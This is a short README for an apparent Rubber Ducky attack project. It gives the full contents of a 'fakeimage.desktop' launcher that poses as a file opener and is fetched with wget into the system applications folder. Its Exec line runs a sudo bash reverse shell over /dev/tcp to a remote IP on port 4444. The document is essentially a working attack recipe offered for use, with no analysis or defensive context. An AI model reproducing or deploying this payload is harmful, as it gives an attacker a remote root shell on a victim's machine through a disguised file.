# Rubber-Ducky-Scripts
## Rubber-Ducky-Scripts
For this project you will need the following files<br> 
**fakeimage.desktop** (Save this file on a remote site or any accessible link - For this project we will use wget to pull this file into the location /usr/local/share/applications/_)

Contents of the file - Include details and save file as fakeimage.desktop
**[Desktop Entry]
Encoding=UTF-8
Name=Open_Custom_File
Exec=sudo /bin/bash -i > /dev/tcp/192.168.145.146/4444 0<&1 2>&1
Terminal=true
Type=Application
Icon=notebook**
